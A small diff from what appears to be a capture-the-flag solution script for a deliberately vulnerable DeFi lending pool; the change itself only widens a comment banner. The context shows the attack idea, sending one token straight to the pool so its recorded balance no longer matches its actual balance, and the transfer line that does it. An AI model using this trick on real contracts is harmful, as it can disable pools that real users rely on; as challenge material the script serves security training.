@@ -60,9 +60,9 @@ def main():
 # You start with 100 DVT tokens in balance.
 # #########################################################
 
-    #############################
-    ##### SOLUTION GOES HERE ####
-    #############################
+    ##############################
+    ##### SOLUTION GOES HERE #####
+    ##############################
 
     # transfer some tokens to the attacker contract, which will subsequently send them to the pool to increase balanceBefore so it doesn't match with poolBalance
     token.transfer(pool.address, 1, _fromAttacker)
